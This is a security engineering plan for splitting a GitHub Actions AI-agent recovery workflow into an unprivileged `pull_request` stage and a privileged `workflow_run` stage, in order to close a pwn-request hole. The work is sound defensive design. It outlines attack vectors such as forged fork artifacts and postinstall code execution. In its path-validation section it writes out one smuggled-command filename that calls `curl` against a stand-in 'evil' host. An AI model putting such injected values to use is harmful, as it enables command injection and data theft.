---
feature: fix-constraints-two-stage-privileged-split
date: 2026-07-01
type: feature
lane: cross-domain
brand_survival_threshold: single-user incident
requires_cpo_signoff: true
parent_issue: 5791
closes: [5814]
supersedes_pr: 5804
adr: ADR-074 (new) + ADR-071 (amend recovery paragraph)
spec: none on this branch — lane defaulted to cross-domain (TR2 fail-closed)
observability: see "## Observability" section
---

# Plan: Redesign `fix-constraints` recovery dispatcher to a two-stage `pull_request` → `workflow_run` privileged split (#5814)

## Enhancement Summary

**Deepened on:** 2026-07-01
**Sections enhanced:** Overview, Research Reconciliation, Architecture Decision (ADR/C4), IaC, Phases 0-5, ACs, Domain Review, Risks, Sharp Edges, Test Scenarios.
**Agents used:** `soleur:engineering:cto` (plan-time); deepen-plan: `security-sentinel`, `architecture-strategist`, `data-integrity-guardian`, + a capability-verification Explore (Git Data API / download-artifact / CodeQL default-setup / Anthropic Admin API) + 2 pre-plan research agents (workflow_run precedent + learnings).

### Key improvements (folded findings)
1. **Corrected a load-bearing security error** (security-sentinel P0): `pull_request` runs the *fork's own* Stage A definition → the artifact is 100% attacker-controlled; the prior "fork → no key → no artifact" reasoning was wrong. Added Stage B's explicit **`isCrossRepository==false` + single-matching-PR gate** as the real fork defense.
2. **Auto-recovery is now fix-only** (data-integrity P0): baseline JSON removed from both allowlists — a baseline-mutating recovery (whitelisting a real leak) aborts at Stage A. Replaces the weaker "label + segregate" mitigation.
3. **Git Data API data-plane** (CTO P0-2, confirmed by security-sentinel): no checkout, no `git apply`; full post-image contents + mandatory `base_tree` + base64 blobs + per-file sha256 verify + mode-pin → untrusted-checkout sink structurally absent + diff-parser class dissolved.
4. **Hardening folded:** positive-charset path allowlist + argv/env-not-shell, artifact resource bounds, Stage B output-string sanitization (escape sequences), draft/no-auto-merge follow-up PR with no false "pre-verified" provenance, name-coupling (`name:`↔`workflows:`) test, Stage B concurrency keyed on `pr_number`.
5. **ADR/C4 corrected** (architecture-strategist): trigger-split is the primary ADR-074 decision (Git Data API the enabling mechanism); ADR-071 must also drop the now-satisfied #5791 promote-to-required blocker; C4 adds the `contributor` actor + reconciles the boundary into the existing scaffold→webapp edge (no duplicate component).
6. **Capability facts pinned live:** download-artifact v4 SHA `d3f86a1…`; Stage B needs `actions: read`; Anthropic Admin API **cannot** create keys (Console-only) or set regular-tier spend limits → capped-key mint is `automation-status: UNVERIFIED`, /work must Playwright the Console.

### New considerations discovered
- "0 CodeQL alerts" proves the checkout sink is gone, NOT artifact-data-trust safety — the explicit gates close that.
- CodeQL `actions` scanning may be off (advanced setup removed in 77c2376); enablement automatability resolved in Phase 0.7.
- Manual-retry path restored (`workflow_dispatch` on read-only Stage A / "push a commit") since the comment trigger is dropped.

## Overview

The `/soleur fix constraints` recovery dispatcher (`fix-constraints.yml`, built for #5791, held in draft PR #5804) trips **3 critical CodeQL `actions/untrusted-checkout-toctou` alerts**. It is an `issue_comment`-triggered job that holds `ANTHROPIC_API_KEY` + `contents: write`, checks out PR-head code (`gh pr checkout`), and **executes it** — `bun install --frozen-lockfile` (postinstall scripts), the api-spend script, and `apps/web-platform/scripts/constraint-gates.sh` — all from the PR head. The author-association + collaborator-permission + head==base gates bound **who** can trigger it, but CodeQL fires on the *structural* sink: a privileged trigger that holds secrets/write executes untrusted-PR-derived code. Gates don't clear it.

Operator decision (2026-06-30): **hold + redesign**, not dismiss-and-merge. The constraint-gate is still informational (not a required branch-protection check), so the founder-deadlock is latent and there is no urgency.

**The fix is architectural** — the GitHub Security Lab "preventing pwn requests" canonical pattern: split the workflow so the *write-capable* stage never co-locates with untrusted code execution.

- **Stage A — `pull_request` (untrusted, NO write token):** runs `bun install --frozen-lockfile --ignore-scripts` + the **full** `constraint-gates.sh` (not bare `depcruise` — preserves the `couldNotResolve` blind-gate self-check); only if the gate is RED **and** the agent has a key (same-repo PR), dispatches the agent (**fix-only — the prompt forbids `--refresh-baseline`/baseline edits; auto-recovery never grows the suppression baseline**) to fix, **re-verifies the gate is green**, and uploads an artifact containing the **full post-image contents of the changed allowlisted files** (NOT a unified diff), each with a per-file `sha256`, + `meta.json` (pr_number, immutable head_sha, head_ref — for cross-checking only). `permissions: contents: read`. No write token. Running untrusted PR code here is the *expected, safe* thing — `pull_request` is CodeQL's designated untrusted context.
- **Stage B — `workflow_run` (privileged, HAS write token):** triggered by Stage A's completion. **CRITICAL — treat the entire artifact (contents AND `meta.json`) as 100% attacker-controlled** (security P0): `pull_request` runs the *fork's own* Stage A workflow definition from the PR head, so a fork can delete the agent/gate steps and upload a hand-crafted artifact while keeping Stage A's `name:` to fire this stage. Therefore: (1) **explicit same-repo gate** — resolve the PR from the trusted `github.event.workflow_run.head_sha` and **require `isCrossRepository == false` before any write** (require exactly one matching open PR; fork PRs → one comment + no-op). (2) **Routing identity from the event, never the artifact** — `head_sha` from the event; `pr_number`/`head_ref` from the API; cross-check `meta.json`, reject on mismatch. (3) **Normalized + positive-charset path allowlist** (allow only `apps/web-platform/{app,components,server}/**`; reject `.github/**`, `*.cjs`, the runner, the suppression baseline, `..`/absolute, symlink/gitlink modes, and any path outside `[A-Za-z0-9._/-]`/containing control chars). (4) **Build the commit via the Git Data API** — blobs (`base64` raw bytes, sha256-verified against `meta.json`) → tree **with mandatory `base_tree`** at `head_sha`, mode pinned `100644` → commit → `soleur/fix-constraints/<pr>` ref — and open a **draft, no-auto-merge** follow-up PR (`Ref #<pr>`, human merge gate). **Stage B NEVER `actions/checkout`s the untrusted tree, never `git apply`s, never runs `bun install` or any PR script.** The untrusted-checkout sink is *structurally absent* (no checkout step to flag); the write token never touches untrusted code → clears the finding by construction. (Note: CodeQL "0 alerts" proves the checkout-sink is gone — it does NOT prove artifact-data-trust safety; the explicit gates above are what close that.)

**UX change (deliberate, ADR-recorded):** the `/soleur fix constraints` *comment* trigger is **dropped**. Recovery becomes **automatic** on any PR whose gate is red and auto-fixable, delivered as a follow-up PR. This is strictly better for the #5791 founder-deadlock target (a non-technical founder's GitHub-web hotfix gets an auto-fix PR with zero ceremony) and removes the entire comment-parse + author-association + exact-match-command surface that CodeQL flagged. See Alternative Approaches for the comment-as-label hybrid that preserves on-demand invocation (deferred).

This branch is off `main`; the redesign-target files exist **only** in held PR #5804 (see Research Reconciliation). Therefore **#5814 supersedes #5804**: it lands the *redesigned* dispatcher + scaffold template + tests + ADR/C4 directly on top of main, and #5804 is **closed** (not merged) when #5814 merges.

**Deliverables:**

1. **Two repo-root workflows** replacing the single held `fix-constraints.yml`:
   - `.github/workflows/fix-constraints-stage-a.yml` — `pull_request`, read-only, agent + patch-artifact producer.
   - `.github/workflows/fix-constraints-stage-b.yml` — `workflow_run`, privileged, artifact-validator + Git Data API commit + bot-branch follow-up PR (no checkout, no `git apply`).
2. **Redesigned tenant template(s)** in `constraint-scaffold` emitting the two-stage split, + scaffold-generator wiring + the parity/emit test redesigned.
3. **ADR-074** (new) recording the two-stage trust-boundary decision; **ADR-071** recovery paragraph amended to point at it; **C4** updated to model the recovery trust boundary.
4. **Wording sweep**: the `agent-owns-gates` recovery model in `SKILL.md`, `constraint-gates.sh` inline recovery annotations, and the scaffold templates change from "comment `/soleur fix constraints` (PLANNED #5791, not yet wired)" → "auto-recovery follow-up PR (wired)".
5. **Capped, rotatable per-tenant Anthropic key** with a hard spend cap, contained in Stage A (bounded-exfil acceptance) — provisioned/prompted by the scaffold (IaC section).

**Scope:** the dispatcher redesign only. The transitive-leak follow-up (#5777), the body-validation gate (#5774), and promoting the constraint-gate to a *required* check (#5778) remain out of scope.

## Research Reconciliation — Spec vs. Codebase

| Claim (issue #5814 / held #5804) | Codebase reality (verified) | Plan response |
|---|---|---|
| "`fix-constraints.yml` trips 3 CodeQL alerts — re-architect it." | `fix-constraints.yml` does **NOT exist on `main` or this branch** — `git show origin/main:.github/workflows/fix-constraints.yml` → absent. It exists **only** on `origin/feat-one-shot-5791-fix-constraints-dispatcher` (held draft PR #5804). | This is a redesign of *unmerged* code. #5814 produces the redesigned files on top of main and **supersedes #5804** (close #5804 on merge). Not a patch of an on-main file. |
| Redesign needs the dispatcher's dependency surface present. | All deps are **already on main**: `.github/actions/anthropic-preflight/action.yml`, `scripts/extract-api-spend.sh`, `.github/workflows/constraint-gates.yml`, `apps/web-platform/scripts/constraint-gates.sh`, `shared-runner.template`. Only the dispatcher + `fix-constraints-workflow.template` + `emit-fix-constraints.test.sh` + the ADR-071 recovery edit + the scaffold FIXWORKFLOW emission are 5804-only. | #5814 **stands alone** on main; no rebase onto #5791's branch required. Re-wire the existing on-main deps into the new Stage A. |
| "Stage A — `pull_request` (no secrets)." | `pull_request` carries secrets for **same-repo** PRs (the solo-founder target); it withholds secrets from **fork** PRs. **BUT** `pull_request` runs the *fork's own* Stage A definition from the PR head — a fork can rewrite Stage A to skip the agent and upload a 100%-attacker-crafted artifact (the "no key" fact does NOT make the artifact safe; security P0). | Same-repo PRs (target user) get the key → agent runs. Fork safety comes from **Stage B's explicit `isCrossRepository == false` gate + treating every artifact as untrusted** — NOT from "forks get no key." The held "head==base" stance is preserved as that Stage B gate (the redesign must not silently drop it). |
| "Push to a bot branch + follow-up PR." | A PR opened via `GITHUB_TOKEN` does **not** trigger CI (`statusCheckRollup: []`, by design, anti-loop). | Acceptable: Stage A **already re-ran and verified** the gate green before producing the patch, so the follow-up PR needs no CI re-trigger to prove correctness. Use `Ref #<pr>` (NOT `Closes`) in the body. Document this reasoning in the ADR. |
| "Repo has CodeQL; `0 alerts` is a check." | Advanced CodeQL setup (`codeql.yml`) was **removed** in commit 77c2376 (merge-queue kill-switch). Default setup is active (`javascript-typescript/python, extended`); **`actions` language scanning is not confirmed enabled**. `codeql-to-issues.yml` polls `gh api .../code-scanning/alerts` and files issues. | "0 alerts" is **not a CI gate**. Verify CodeQL `actions` scanning is enabled (`gh api repos/<repo>/code-scanning/default-setup`); if absent, enabling it is a Phase-0 prerequisite. Verify "0 alerts" post-merge via `gh api .../code-scanning/alerts?state=open` filtered to the redesigned workflows — automatable, not dashboard-eyeball. |
| Held design "pushes to the PR head ref." | TOCTOU risk: `gh pr checkout` fetches the *latest* head of a mutable branch ref. | **Stage B never checks out the untrusted tree at all** — it builds the commit via the Git Data API on top of the trusted `github.event.workflow_run.head_sha` (CTO P0-1/P0-2). No mutable ref, no checkout step, no TOCTOU, no execution sink → the CodeQL finding is *structurally absent*, not merely mitigated. The artifact's `meta.json` SHA is a cross-check only; the canonical SHA is the event field. |

## User-Brand Impact

**If this lands broken, the user experiences:** a non-technical founder's GitHub-web hotfix trips the L1 constraint-gate; the redesigned auto-recovery either (a) never produces a follow-up PR (Stage A mis-gated / artifact never passed → the original founder-deadlock persists silently), or (b) opens a follow-up PR with a *wrong or empty* patch that doesn't green the gate, eroding trust in the auto-recovery.

**If this leaks, the user's repo write-access / API key is exposed via:** the very sink CodeQL flagged — untrusted PR code executing in a context holding `ANTHROPIC_API_KEY` + `contents: write`. A regression that re-co-locates the write token with untrusted execution (e.g., Stage B accidentally running `bun install` or a PR script, or the patch allowlist failing open and letting a malicious patch edit `.github/workflows/**`) re-opens arbitrary-code-execution / secret-exfil / protected-branch-push. Bounded residual: `ANTHROPIC_API_KEY` runs over untrusted code in Stage A by necessity — contained by a **capped, rotatable per-tenant key** (bounded-spend exfil), never the privileged stage.

**Brand-survival threshold:** single-user incident (founder-deadlock + ACE/secret-exfil surface).

> CPO sign-off required at plan time before `/work` begins. CTO/security framing is captured in the Domain Review + ADR-074. `user-impact-reviewer` **and** `security-sentinel` will be invoked at review time (review skill conditional-agent block), with the `untrusted-checkout-toctou` / privileged-trigger-untrusted-execution class **named explicitly in the spawn prompt** (the class LLM review missed on #5804).

## Architecture Decision (ADR/C4)

This redesign **moves a trust boundary** (untrusted execution relocated off the privileged trigger; write capability isolated to a non-executing stage) and **reverses** the held ADR-071 recovery mechanism (comment→push-to-head → auto→follow-up-PR). ADR + C4 are **in-scope deliverables of this plan**, not deferred.

### ADR

- **Create `ADR-074` — "fix-constraints recovery: two-stage `pull_request`→`workflow_run` privileged split."** (ADR-074 confirmed free; highest on main is ADR-073.) **The PRIMARY decision is the two-stage trigger split** (unprivileged secret-less producer / privileged non-executing consumer) — that is the invariant a future reader must not break. The **Git Data API blob/tree/commit data-plane** (Stage A uploads full post-image file contents) is the *enabling mechanism* that realizes the split: it makes the untrusted-checkout sink *structurally absent* (no checkout step to flag) and dissolves the diff-parser attack class. Foreground the trust-boundary split as the decision; frame Git Data API as how it's realized (architecture-strategist P2 — don't let a future apply-path optimizer miss that the trigger split is the invariant). Also record: **the artifact is fully attacker-controlled** because `pull_request` runs the fork's own Stage A definition, so Stage B's `isCrossRepository==false` gate + untrusted-artifact treatment (event-sourced identity, charset+size+symlink path allowlist, sha256 byte-verify) are load-bearing; the **fix-only baseline-prohibition** (data-integrity P0 — auto-recovery never grows the suppression baseline; baseline growth is a maintainer-only local action); the dropped comment trigger + the documented manual-retry path (push a commit, or the deferred `workflow_dispatch`/comment-label hybrid); the follow-up-PR-via-GITHUB_TOKEN no-CI-retrigger reasoning; the capped per-tenant key bounded-exfil acceptance + the **distinct-SHA key-burn vector** (concurrency collapses same-SHA only; the spend cap, not concurrency, bounds a multi-SHA push-storm); a one-line note that this credential surface is intentionally outside the TF-only principle (AP-001) for lack of a provider; and **Alternatives Considered** (single-job permission-downscope — rejected; checkout-head + `git apply` of a diff — rejected as primary; egress-restricted self-hosted runner — deferred; comment→label→`pull_request:[labeled]` hybrid — deferred). **Pin the Decision + artifact-schema section in Phase 0/1 before Stage A freezes the artifact format** (architecture-strategist P2 — the schema IS an ADR-074 decision). Author via `/soleur:architecture create 'Two-stage privileged-recovery dispatcher (pull_request→workflow_run); Git Data API data-plane'`.
- **Amend `ADR-071`** — TWO edits (architecture-strategist P1): (1) recovery paragraph: replace the held-PR wording ("dispatcher wired via `fix-constraints.yml`, pushes to PR head, author-association gated") with "auto-recovery via the two-stage split (ADR-074); follow-up PR, not head-push"; (2) **the promote-to-required blocker** — main's ADR-071 blocks promotion on **#5791 AND #5778**; this PR makes the dispatcher exist, so the **#5791 half is now satisfied — only #5778 remains**. Update that sentence too (not just the recovery prose), or it leaves a stale blocker. (Amending main's paragraph directly is the clean single-source edit since #5804's ADR-071 edit never lands.)

### C4 views

**Read all three model files** (`knowledge-base/engineering/architecture/diagrams/{model.c4,views.c4,spec.c4}`). Verified current state: **modeled** — `founder` actor (model.c4:8), `anthropic` external system (model.c4:196), `constraintscaffold` component (model.c4:138-141) with edge `constraintscaffold -> webapp "Generates L1 import-boundary gate (CI)"` (model.c4:312). **NOT modeled** — the GitHub Actions CI runner, the fix-constraints recovery dispatcher + its `pull_request`/`workflow_run` trust boundary, a generic Contributor (untrusted PR author) distinct from the Owner-founder.

**Re-scoped per architecture-strategist P1** (invert the plan's earlier hedge — the *actor* is the safe add, a first-class *component* is the gated one):
- **Add the `contributor` `#external` actor** (untrusted PR author, distinct from the trusted `founder`) — this is the genuinely missing element and the highest-signal, cheapest change. The model currently has only the trusted `founder`.
- **Model the trust boundary as an edge/annotation, NOT a duplicate component.** `constraintscaffold` is nested under `platform.plugin` (the plugin system); a recovery *dispatcher* is CI-harness infra generated into the consumer repo's CI — dropping a sibling `fixconstraints` component under `platform.plugin` mis-models it, AND a new `fixconstraints -> webapp` edge would DUPLICATE the existing `constraintscaffold -> webapp "Generates L1 import-boundary gate (CI)"` edge. Instead: extend that existing edge's description (or place a recovery edge under the `github` external system) to capture `contributor → untrusted Stage A` and `privileged Stage B → webapp (follow-up PR)`. Reconcile, don't duplicate.
- **Reserve a first-class `fixconstraints` component ONLY if** it renders meaningfully AND gets a defensible parent (the `github` system, NOT `platform.plugin`). Default: actor + edge-annotation, no new component.
- **Access-relationship change:** none on the *product* data model (CI-harness infra).

**Task:** edit `model.c4` to add the `contributor` `#external` actor + the trust-boundary edge (reconciled into/under the existing scaffold→webapp edge or the `github` system), add the `view … include` line in `views.c4` so it renders, and fix any element description the change falsifies. Run `apps/web-platform/test/c4-code-syntax.test.ts` + `c4-render.test.ts` (a `view include` of an undefined element fails there, not at `tsc`). "No C4 impact" is **rejected** — the `contributor` actor + trust boundary are a genuine architectural addition the model omits.

### Sequencing

ADR-074 is authored now describing the target state; it ships **with** this PR (status: accepted). No soak gating (the "0 CodeQL alerts" verification is a one-time post-merge check, not a multi-day soak).

## Infrastructure (IaC)

The redesign introduces one new credential surface: a **capped, rotatable Anthropic API key with a hard spend cap**, contained in Stage A.

### Terraform changes

- **No Terraform provider for Anthropic API-key minting; the Admin API is confirmed INSUFFICIENT for full auto-provisioning** (verified at deepen-plan): the Admin API can create a **Workspace** (`POST /v1/organizations/workspaces`) but **cannot create API keys** (Console-only — Admin API only lists/archives existing keys) and **cannot set spend limits on regular-tier workspaces** (the Spend Limits API is Claude-Enterprise-only; the workspace-update endpoint exposes only name/color/tags/CMEK). So the capped-key mint is **not fully API-automatable**. Per `hr-verify-repo-capability-claim-before-assert` + learning 2026-06-17, this does NOT license an operator-only assertion: the Anthropic **Console** key-creation + spend-limit UI runs under an authenticated session and is **presumptively Playwright-automatable**. `/work` MUST run a Playwright attempt against the Console (create workspace key + set spend limit) and only hard-block to operator if it reaches a named human gate (CAPTCHA/OTP/MFA). Mark `automation-status: UNVERIFIED — /work MUST attempt Playwright before any operator handoff`.
- For the **Soleur dogfood repo:** the existing `ANTHROPIC_API_KEY` GitHub Actions secret is reused by Stage A; cost-containment is a **workspace spend limit** in the Anthropic Console/Admin API (not a new TF resource). Mark `automation-status: UNVERIFIED — /work MUST attempt Admin-API/Playwright before any operator handoff`.
- For the **tenant template:** the scaffold prompts the tenant for a capped key (or, if Admin-API automatable, provisions one). No `.tf` is added by this plan.

### Apply path

Cloud-init / Terraform not involved (no server, no systemd, no DNS). The only "infra" is a GitHub Actions secret + an Anthropic workspace spend limit — both vendor-console/Admin-API surfaces. Path: (a) verify Admin-API automatability → automate; (b) else Playwright against the Console; (c) hard-block to operator **only** if a real attempt reaches a named human gate.

### Distinctness / drift safeguards

`dev != prd` is N/A (no Supabase/Doppler env split here). The capped key's spend limit is the blast-radius bound on the accepted-exfil residual.

### Vendor-tier reality check

Anthropic Admin API / Workspaces availability may be plan-tier-gated — verify the account tier supports workspace-scoped keys + spend limits before prescribing the automated mint. If not available on the current tier, the spend cap is set account-wide and the key rotated manually (documented, with a follow-up issue).

## Observability

```yaml
liveness_signal:
  what: "Stage A + Stage B workflow run conclusions (GitHub Actions run history)"
  cadence: "per PR push (Stage A) / per Stage A completion (Stage B)"
  alert_target: "GitHub Actions run list + the follow-up-PR / outcome comment on the original PR"
  configured_in: ".github/workflows/fix-constraints-stage-{a,b}.yml"
error_reporting:
  destination: "GitHub Actions step annotations (::error::, sanitized) + an outcome comment on the original PR for every terminal state"
  fail_loud: "yes — Stage A failures surface as a red check on the PR; Stage B failures comment 'auto-recovery could not apply — maintainer needed' (never silent)"
failure_modes:
  - mode: "agent makes no edits / gate still red after fix"
    detection: "Stage A re-runs constraint-gates.sh; rc!=0 or empty diff → no artifact uploaded"
    alert_route: "Stage A produces no artifact → Stage B no-ops; Stage A logs the give-up reason"
  - mode: "artifact fails the path allowlist / charset / size bounds (touches .github/**, *.cjs, runner, baseline, traversal, or oversized)"
    detection: "Stage B validator rejects pre-write"
    alert_route: "Stage B comments 'fix not auto-applicable (out-of-scope/invalid edit) — maintainer needed' on the original PR"
  - mode: "blob byte-hash mismatch / meta.json↔artifact↔allowlist inconsistency"
    detection: "Stage B sha256 verify fails-closed before commit"
    alert_route: "Stage B comments the integrity failure; no commit"
  - mode: "fork PR (cross-repository)"
    detection: "Stage B resolves PR from head_sha; isCrossRepository == true (or 0/≥2 matches)"
    alert_route: "Stage B comments 'fork PRs need a maintainer to run constraint-scaffold locally'; no write"
logs:
  where: "GitHub Actions run logs for both workflows; api-spend artifact (90-day retention) via extract-api-spend.sh in Stage A"
  retention: "GitHub Actions default (90 days for logs/artifacts)"
discoverability_test:
  command: "gh run list --workflow=fix-constraints-stage-a.yml --limit 5 --json conclusion,headBranch && gh api repos/{owner}/{repo}/code-scanning/alerts?state=open --jq '[.[]|select(.rule.id==\"actions/untrusted-checkout-toctou\")]|length'"
  expected_output: "Stage A runs listed with conclusions; untrusted-checkout-toctou open-alert count == 0"
```

## Implementation Phases

Phases are ordered **contract-before-consumer** (Stage A's artifact contract before Stage B's consumer; ADR/C4 before code is fine to interleave but the artifact schema is the load-bearing contract).

### Phase 0 — Preconditions & capability verification (de-risk before building)
- 0.1 Confirm ADR-074 free; confirm all on-main deps (anthropic-preflight, extract-api-spend.sh, constraint-gates.sh) present. (Already verified in this plan — re-confirm at /work.)
- 0.2 **CodeQL `actions` scanning state:** `gh api repos/{owner}/{repo}/code-scanning/default-setup` → confirm `actions` is in `languages`. If absent, enabling it (PATCH default-setup, or note the 0-alerts AC is dashboard-verified) is a prerequisite. Record the finding.
- 0.3 **claude-code-action CLI form:** the held `claude_args: '--model claude-sonnet-4-6 --max-turns 20 --allowedTools Bash,Read,Write,Edit,Glob,Grep'` is CI-validated; reuse **verbatim**. Do NOT substitute a model id from memory (model-launch-review owns pin freshness). Note the token-revocation learning (2026-03-02): the agent's post-step revokes its GH token — irrelevant here because Stage A never pushes and Stage B uses its own `workflow_run` token; capture the diff in a **shell step after** the agent, not via the agent's GH token.
- 0.4 **download-artifact SHA:** the repo has no `actions/download-artifact` precedent. Pin to `actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4` (resolved live at deepen-plan via `gh api repos/actions/download-artifact/git/refs/tags/v4` 2026-07-01 — re-confirm at /work). upload-artifact already pinned `ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2` (confirmed live; reuse).
- 0.5 **Anthropic capped-key automatability** (IaC section) — verify Admin API vs Playwright vs operator. Mark UNVERIFIED until a real attempt.
- 0.6 **Pin ADR-074's Decision + artifact-schema** before Stage A freezes the artifact format (architecture-strategist P2 — the schema is an ADR-074 decision; prose can finalize in Phase 4).
- 0.7 **CodeQL `actions`-scanning enablement automatability** — resolve in Phase 0 whether enabling it (if absent from default setup) is API-automatable (`gh api ... code-scanning/default-setup` PATCH) or an operator/admin action, so it can't become a late manual gate mid-build.
- 0.8 **Manual-retry path** (architecture-strategist P1-adv): dropping the comment trigger removes on-demand re-invocation. Add `workflow_dispatch` to the **read-only Stage A** (no write surface) as a cheap manual re-invoke; document "push a commit to retry" in ADR-074 + SKILL.md so the founder is never left with no manual recovery.
  - (Removed: the `constraint-baseline-growth` label is no longer needed — auto-recovery is fix-only and never grows the baseline (data-integrity P0); baseline growth stays a maintainer-only local action.)

### Phase 1 — Stage A workflow (`fix-constraints-stage-a.yml`)
- `on: pull_request: types: [opened, synchronize, reopened]`, `paths:` the constrained surface (`apps/web-platform/app/**`, `components/**`, `server/**`, `apps/web-platform/.dependency-cruiser*`). Defense-in-depth: skip on `soleur/fix-constraints/*` head branches (P1 loop guard — Stage B's follow-up PR must not re-dispatch). `concurrency: group fix-constraints-a-${{ github.event.pull_request.head.sha }}, cancel-in-progress: true` (P1 key-burn dedup — one head SHA can't fan out N agent dispatches).
- `permissions: contents: read` (NO write, NO pull-requests). Top-level none; job-level explicit.
- Steps: SHA-pinned `actions/checkout` (defaults to immutable `pull_request.head.sha`); `anthropic-preflight` gate; `setup-bun` + `bun install --frozen-lockfile --ignore-scripts` (Setup-Bun toolchain lesson — the gate needs `node_modules/.bin/depcruise`; `--ignore-scripts` kills the postinstall ACE vector over fork code; CTO §6); run the **full** `constraint-gates.sh` (NOT bare `depcruise` — preserves the `couldNotResolve` blind-gate self-check) and capture rc; **if rc!=0 AND key present:** dispatch `claude-code-action` (file edits only, no commit/push — same prompt as held); re-run the **full** `constraint-gates.sh` to VERIFY (rc must be 0 AND `git diff` non-empty); `extract-api-spend.sh` → upload api-spend artifact.
- **Produce the recovery artifact as full post-image FILE CONTENTS, not a diff** (CTO P0-2): compute the changed-file set (`git diff --name-only`), assert every path is in the allowlist (else abort — don't ship an out-of-scope file), copy each changed file's *current* content into the artifact preserving its repo-relative path, and write `meta.json` (`pr_number`, `head_sha`, `head_ref`, the changed-path list, and a `touches_baseline` boolean if `.dependency-cruiser-known-violations.json` changed). Upload via `actions/upload-artifact` (name `fix-constraints-patch-<pr>`). No artifact when the gate was already green, the agent made no change, or verify is still red.
- Sanitize every PR-derived string passed to `run:` via `env:` (never inline `${{ github.event.* }}`); strip `[\x00-\x1f\x7f  ]` before any annotation (log-injection learning).

### Phase 2 — Stage B workflow (`fix-constraints-stage-b.yml`)
- `on: workflow_run: workflows: ["fix-constraints-stage-a"], types: [completed]`. Guard `if: github.event.workflow_run.conclusion == 'success'` (precedent: deploy-docs.yml:16-18,32 / post-merge-monitor.yml). Stage B's workflow file is always read from the **default branch** (the security property that makes the pattern safe).
- `permissions: contents: write, pull-requests: write, actions: read` (the `actions: read` scope is REQUIRED for the cross-workflow `download-artifact` — verified at deepen-plan).
- Download the Stage A artifact via `actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4` with `run-id: ${{ github.event.workflow_run.id }}` + `github-token: ${{ github.token }}`. If no artifact → exit 0 (no-op).
- **Explicit same-repo gate (security P0-1 — the load-bearing fork defense):** the held design's `head==base` stance was silently dropped; restore it as a Stage B gate. `pull_request` runs the *fork's own* Stage A definition, so the artifact is fully attacker-controlled regardless of the agent/key. Resolve the PR from the trusted `HEAD_SHA` and **require `isCrossRepository == false` AND exactly one matching open PR before any write** (fork PR or 0/≥2 matches → one comment + no-op). This single gate collapses most of the fork-artifact surface; pre-merge AC + test.
- **Routing identity from the EVENT, never the artifact (CTO P0-1/Q4):** `HEAD_SHA = github.event.workflow_run.head_sha`. Resolve `pr_number` + `head_ref` by GitHub API from `HEAD_SHA` (NOT `workflow_run.pull_requests`, empty for fork PRs), then **cross-check against `meta.json` and reject on any mismatch**. Validate `HEAD_SHA` `^[0-9a-f]{40}$`; `pr_number` `^[0-9]+$` BEFORE constructing the branch name (closes ref-metacharacter injection).
- **Path validation (security crux):** for each artifact file path, normalize/canonicalize, reject any absolute path or `..` segment, reject **any char outside `[A-Za-z0-9._/-]` and any control/newline char** (security P1-2 — blocks shell-metachar filenames like `app/x;$(curl evil).tsx`; ALL artifact paths/contents are argv/env-passed or handled via the Git Data API client, NEVER string-interpolated into a `run:` shell), reject symlink (`120000`) and gitlink (`160000`) modes, then **ALLOW only** `apps/web-platform/{app,components,server}/**`; **REJECT** (hard-fail, comment, no write) `.github/**`, `**/*.cjs`, `apps/web-platform/scripts/constraint-gates.sh`, **`apps/web-platform/.dependency-cruiser-known-violations.json` (fix-only — see baseline-prohibition below)**, and anything else. Fail-closed: any unmatched path rejects the WHOLE artifact. **Resource bounds (security P1-3):** cap file count + per-file size + total size BEFORE the blob loop (reject a zip-bomb / thousand-file artifact, CWE-400).
- **Build the commit via the Git Data API — NO checkout of the untrusted tree, NO `git apply`** (CTO P0-2): for each allowlisted file create a blob (`POST /git/blobs` with `encoding: base64` of the raw bytes — never a UTF-8 string, so CRLF/BOM/trailing-newline survive byte-identically); build a tree with **`base_tree` = the tree of `HEAD_SHA`** (`POST /git/trees`; **omitting `base_tree` deletes every other repo file** in the bot branch — mandatory, with a test asserting the bot commit's tree differs from `HEAD_SHA` only in the allowlisted paths); pin every tree entry `mode: 100644` and **reject any `100755`/`120000` symlink/`160000` gitlink mode**; create a commit (`POST /git/commits`, parent = `HEAD_SHA`); create the ref `refs/heads/soleur/fix-constraints/<pr>` (`POST /git/refs`). No `actions/checkout` of head, no `bun install`, no script execution anywhere in Stage B. `concurrency: group fix-constraints-b-<pr_number>` so two Stage A runs on the same PR can't race the ref create.
- **Byte-round-trip integrity (data-integrity P1):** Stage A verifies the gate on its *working tree*, but Stage B commits a tree *reconstructed from artifact bytes* — these are only the same artifact if the bytes round-trip exactly. Stage A writes a per-file `sha256` into `meta.json`; Stage B verifies each blob's bytes against it before committing (fail-closed on mismatch). Without this, "Stage A pre-verified green" is an assumption, not a guarantee (and there is no CI re-run to catch a drifted tree). Also cross-check: commit exactly the files in the artifact ∩ `meta.json` changed-path list ∩ allowlist — any file in one but not the others fails closed.
- **Auto-recovery is FIX-ONLY — `.dependency-cruiser-known-violations.json` is NOT in either allowlist (data-integrity P0, supersedes the earlier "segregate baseline" mitigation):** the agent can green a tripped gate two ways — genuinely fix the offending import, OR append the violating edge to the baseline (`--refresh-baseline`) which **whitelists a real client→server-secret leak**. A label+banner+edge-enumeration is a *no-op for the non-technical founder* (it hands them more info they cannot evaluate), and baseline-growth is the agent's *path of least resistance*, so auto-recovery would routinely manufacture security-regression PRs routed to the least-able reviewer. Therefore the baseline JSON is **excluded from the Stage A artifact allowlist AND the Stage B path allowlist**. If the agent greens via baseline mutation, the changed-file set contains an out-of-allowlist path → **Stage A aborts the artifact** → Stage B no-ops → the deadlock simply persists, surfaced as "this gate needs a maintainer — possible real leak." Failure asymmetry favors this: over-blocking costs the status-quo deadlock; under-blocking ships a secret to the browser bundle. Defense-in-depth: (1) the Stage A agent prompt is instructed **fix-only, never `--refresh-baseline`** (cheap, non-deterministic — not a control); (2) the Stage B allowlist **enforces** it (deterministic — the real control). Keep a `touches_baseline` detector only as *loudness on an attempted allowlist bypass*, never as a sanctioned path. (The local/agent-owned `constraint-scaffold --refresh-baseline` path stays valid — only the AUTO dispatcher is fix-only.)
- **Derive `touches_baseline` server-side, never trust `meta.json` (security P0-2):** with the baseline excluded from the allowlist, a baseline file in the artifact is rejected outright; Stage B must NOT branch on the artifact's `touches_baseline` field (attacker-controlled). The `touches_baseline` detector is loud telemetry only.
